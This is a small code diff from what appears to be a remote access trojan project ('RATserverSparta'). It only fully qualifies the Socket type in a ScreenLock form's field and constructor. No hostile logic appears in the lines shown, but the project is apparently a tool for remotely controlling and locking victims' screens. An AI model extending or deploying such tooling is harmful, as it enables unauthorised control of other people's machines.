@@ -14,8 +14,8 @@ namespace RATserverSparta.Tools.Screen
 {
     public partial class ScreenLock : Form
     {
-        private Socket SocketClient;
-        public ScreenLock(Socket SocketClient)
+        private System.Net.Sockets.Socket SocketClient;
+        public ScreenLock(System.Net.Sockets.Socket SocketClient)
         {
             InitializeComponent();
             this.SocketClient = SocketClient;
